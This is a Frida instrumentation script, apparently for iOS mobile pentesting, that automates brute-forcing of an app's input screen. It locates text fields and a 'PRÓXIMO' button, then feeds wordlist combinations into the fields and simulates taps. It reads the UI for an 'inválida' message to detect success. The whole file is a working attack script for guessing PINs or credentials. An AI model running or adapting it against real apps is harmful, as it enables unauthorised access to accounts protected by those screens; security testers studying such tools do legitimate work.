'use strict';

recv('start', function onMessage(msg) {

    /* == Config =========================================================== */

    /* placeholders to match [textFields in order] and actionButton */
	var fieldsToMatch = ['2222']; // ['2222','22222-2']; ['2222'] ...
    var goButtnToMatch = 'PRÓXIMO'; // 'ok'; 'go'; 'login'; 'enter' ...

    /* delay to check the success */
	var sleep = 12;

    /* success conditions */
	function checkSuccess(attemptArray) {
		ObjC.classes.NSThread.sleepForTimeInterval_(sleep);

		var viewStr = ObjC.classes.UIWindow.keyWindow().recursiveDescription().toString();
		var success = true;

		if (viewStr.indexOf('inválida') !== -1)
			success = false;

		return (success + '|' + attemptArray.toString());
	}

    /* == Basic checks ===================================================== */

    if (msg.list.length != fieldsToMatch.length) {
        send('warn|The number of wordlists and field matches is not the same');
		send('done|');
        return;
    }

    /* == Finding brute-forcible fields ==================================== */

    var matchCounter = 0;
	var fieldsFound = [];
	var textFields = ObjC.chooseSync(ObjC.classes.UITextField);

	for (var i = 0; i < textFields.length; i++) {
		var fd = textFields[i];
		if (fd.text()) {
            for (var j = 0; j < fieldsToMatch.length; j++) {
                if (fd.text().toString() == fieldsToMatch[j]) {
                    if (fieldsFound[j] == undefined) {
                        fieldsFound[j] = fd;
                        matchCounter++;
                        send('[*] Match found for field#' + j);
                    } else {
                        send('[*] Double match found for field#' + j + '! Automation may fail\n');
                    }
                }
            }
		}
	}

    var goButtnFound;
	var buttons = ObjC.chooseSync(ObjC.classes.UIButton);

	for (var i = 0; i < buttons.length; i++) {
		var bt = buttons[i];
		if (bt.titleLabel().text() && bt.titleLabel().text().toString() == goButtnToMatch) {
			if(goButtnFound == undefined) {
				goButtnFound = bt;
				send('[*] Match found for goButtn\n');
			} else {
				send('[*] Double match found for goButtn! Automation may fail\n');
				break;
			}
		}
	}

	/* == Brute-forcing ==================================================== */

    function cartesianProduct(arrayOfArray) {
        if (!arrayOfArray || arrayOfArray.length == 0)
            return arrayOfArray;
        var i, j, l, m, a1, o = [];
        a1 = arrayOfArray.splice(0, 1)[0];
        arrayOfArray = cartesianProduct(arrayOfArray);
        for (i = 0, l = a1.length; i < l; i++) {
            if (arrayOfArray && arrayOfArray.length) for (j = 0, m = arrayOfArray.length; j < m; j++)
                o.push([a1[i]].concat(arrayOfArray[j]));
            else
                o.push([a1[i]]);
        }
        return o;
    }

	if ((goButtnFound != undefined) && (matchCounter == fieldsToMatch.length)) {
		/* getting wordlists */
        var wordlists = [];
        var inputs = msg.list;
        for (var i = 0; i < inputs.length; i++) {
            wordlists[i] = inputs[i].trim().split('\n');
        }

        inputs = cartesianProduct(wordlists);

        for (var i = 0; i < inputs.length; i++) {
            var attemptValues = inputs[i];
            /* altering UIKit values using the main thread (https://github.com/frida/frida/issues/664) */
            ObjC.schedule(ObjC.mainQueue, function () {
                for (var j = 0; j < fieldsFound.length; j++) {
                    fieldsFound[j].setText_(attemptValues[j]);
                }
                send('[' + (i+1) + '] Trying -> ' + attemptValues.toString());
                /* using the event UIControlEventTouchUpInside to simulate a click */
                goButtnFound.sendActionsForControlEvents_(1 << 6);
            });
            /* checking success conditions */
            send(checkSuccess(attemptValues));
        }
		send('done|');

	} else {
		send('warn|Required matches not found... Please try different matches');
		send('done|');
	}
});
